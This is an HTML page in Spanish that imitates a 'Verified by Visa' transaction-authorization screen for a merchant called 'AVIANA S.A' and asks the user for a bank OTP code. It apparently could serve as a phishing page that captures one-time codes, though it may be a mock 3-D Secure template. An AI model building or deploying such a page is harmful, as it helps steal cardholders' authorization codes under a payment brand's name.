<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Autorización de transacción</title>

  <!-- Tipografías limpias -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@400;600;700;800&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg:#f5f6f8;
      --card:#ffffff;
      --text:#111827;
      --muted:#6b7280;
      --border:rgba(2,6,23,.08);
      --primary:#111;
      --primary-contrast:#fff;
      --radius:18px;
      --focus:#de0108;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      background:var(--bg);
      font-family:"Red Hat Display",system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial,sans-serif;
      color:var(--text);
    }

    /* Wrapper centrado */
    .wrap{
      min-height:100%;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
    }

    /* Tarjeta */
    .auth-card{
      width:min(720px, 100%);
      background:var(--card);
      border:1px solid var(--border);
      border-radius:var(--radius);
      box-shadow:0 10px 30px rgba(16,24,40,.08);
      padding: clamp(20px, 3vw, 28px);
    }

    /* Top bar con logos */
    .card-top{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:16px;
      padding-bottom:16px;
      border-bottom:1px solid var(--border);
    }
    .brand-left{display:flex;align-items:center;gap:10px}
    .brand-left img{height:22px}
    .brand-right img{height:24px}

    h1{
      font-size: clamp(20px, 2.2vw, 28px);
      line-height:1.2;
      margin:18px 0 6px;
      font-weight:800;
    }
    .lead{
      color:var(--text);
      font-size: clamp(15px, 1.7vw, 18px);
      margin:0 0 16px;
    }
    .bold{font-weight:800}

    .info-grid{
      display:grid;
      grid-template-columns: 1fr;
      gap:10px 18px;
      margin:12px 0 20px;
    }
    .row{
      display:grid;
      grid-template-columns: 120px 1fr;
      gap:14px;
      font-size:15px;
    }
    .row .label{color:var(--muted)}
    .row .value{font-weight:700}

    /* Form */
    .form{
      display:grid;
      grid-template-columns:1fr;
      gap:14px;
      margin-top:8px;
    }
    label{font-weight:700}
    input[type="text"], input[type="password"], input[type="number"]{
      width:100%;
      height:52px;
      padding:0 14px;
      border:1px solid #e5e7eb;
      border-radius:12px;
      font-size:16px;
      outline:none;
      background:#fff;
      transition:border-color .15s, box-shadow .15s;
    }
    input:focus{
      border-color:var(--focus);
      box-shadow:0 0 0 3px rgba(222,1,8,.12);
    }

    .helper{
      color:var(--muted);
      font-size:14px;
      margin:4px 0 18px;
    }

    .actions{display:flex;justify-content:center;margin-top:6px}
    .btn{
      display:inline-flex;align-items:center;justify-content:center;
      min-width:180px;height:48px;padding:0 20px;
      border-radius:999px;border:0;cursor:pointer;
      background:var(--primary);color:var(--primary-contrast);
      font-weight:800;font-size:16px;
      transition:transform .05s ease, opacity .15s ease;
    }
    .btn:active{transform:translateY(1px)}
    .btn:disabled{opacity:.6;cursor:not-allowed}

    /* Responsivo */
    @media (min-width:560px){
      .info-grid{grid-template-columns:1fr 1fr}
    }
  </style>
</head>
<body>

  <div class="wrap">
    <div class="auth-card" role="dialog" aria-labelledby="title" aria-describedby="desc">
      <!-- Encabezado / logos -->
      <div class="card-top">
        <div class="brand-left">
          <img src="./assets/logos/secure.svg" alt="100% Secure" onerror="this.style.display='none'">
        </div>
        <div class="brand-right">
          <img src="./assets/logos/verified-by-visa.svg" alt="Verified by Visa" onerror="this.style.display='none'">
        </div>
      </div>

      <!-- Título y descripción -->
      <h1 id="title">Autorización de transacción</h1>
      <p id="desc" class="lead">
        La transacción de <span id="merchant" class="bold">AVIANA&nbsp;S.A</span> por
        <span id="amount" class="bold">$ 22,95 USD</span> con tarjeta terminada en
        <span id="last4" class="bold">1111</span> debe ser autorizada.
      </p>

      <!-- Datos de referencia -->
      <div class="info-grid" aria-label="Detalles de la compra">
        <div class="row">
          <div class="label">Comercio:</div>
          <div class="value" id="merchantRef">AVIANA S.A</div>
        </div>
        <div class="row">
          <div class="label">Monto:</div>
          <div class="value" id="amountRef">$ 22,95 USD</div>
        </div>
        <div class="row">
          <div class="label">Tarjeta:</div>
          <div class="value" id="cardRef">**** **** **** 1111</div>
        </div>
      </div>

      <!-- Form OTP -->
      <form id="otp-form" class="form" method="post" action="">
        <div>
          <label for="otp">Código OTP</label>
          <input
            id="otp"
            name="otp"
            type="text"
            inputmode="numeric"
            autocomplete="one-time-code"
            placeholder="Ingresa el código"
            maxlength="8"
            required
          >
        </div>

        <p class="helper">Revisa el código enviado por tu banco y escríbelo aquí para autorizar la compra.</p>

        <div class="actions">
          <button id="btn-verify" class="btn" type="submit">Verificar</button>
        </div>
      </form>
    </div>
  </div>

  <!-- JS opcional: si tu backend inyecta valores, puedes setearlos aquí sin romper nada -->
  <script>
    // Este bloque es seguro: si existen variables globales las usamos; si no, dejamos los defaults.
    (function () {
      try {
        // Ejemplos: window.AUTH_MERCHANT, AUTH_AMOUNT, AUTH_LAST4 podrían venir del backend
        var merchant = window.AUTH_MERCHANT || document.getElementById('merchantRef').textContent;
        var amount   = window.AUTH_AMOUNT   || document.getElementById('amountRef').textContent;
        var last4    = window.AUTH_LAST4    || (document.getElementById('cardRef').textContent.match(/(\d{4})$/)||[])[0];

        // Refrescar línea grande
        document.getElementById('merchant').textContent = merchant;
        document.getElementById('amount').textContent   = amount;
        document.getElementById('last4').textContent    = last4;

        // Por si necesitas enfocar el campo automáticamente
        setTimeout(function(){ var el=document.getElementById('otp'); if(el) el.focus(); }, 150);
      } catch(e){}
    })();
  </script>
</body>
</html>
